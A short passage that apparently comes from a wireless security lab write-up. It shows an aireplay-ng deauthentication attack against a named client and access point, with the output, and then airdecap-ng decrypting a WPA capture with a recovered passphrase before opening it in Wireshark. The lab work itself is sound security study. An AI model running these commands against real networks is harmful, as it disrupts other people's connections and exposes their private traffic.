1. Just like 08, but with 10 handshakes instead of 1.
```bash
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c 28:6C:07:6F:F9:44 wlan0mon
20:40:42  Waiting for beacon frame (BSSID: F0:9F:C2:71:22:12) on channel 6
20:40:43  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]
20:40:43  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]
20:40:44  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]
20:40:44  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]
20:40:45  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]
20:40:45  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]
20:40:46  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]
20:40:46  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]
20:40:47  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]
20:40:48  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]
```

2. 
```bash
sudo airdecap-ng -e wifi-mobile -p starwars1 wifi-mobile-03.cap
Total number of stations seen            4
Total number of packets read          2842
Total number of WEP data packets         0
Total number of WPA data packets       237
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       138
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0

wireshark wifi-mobile-03-dec.cap
```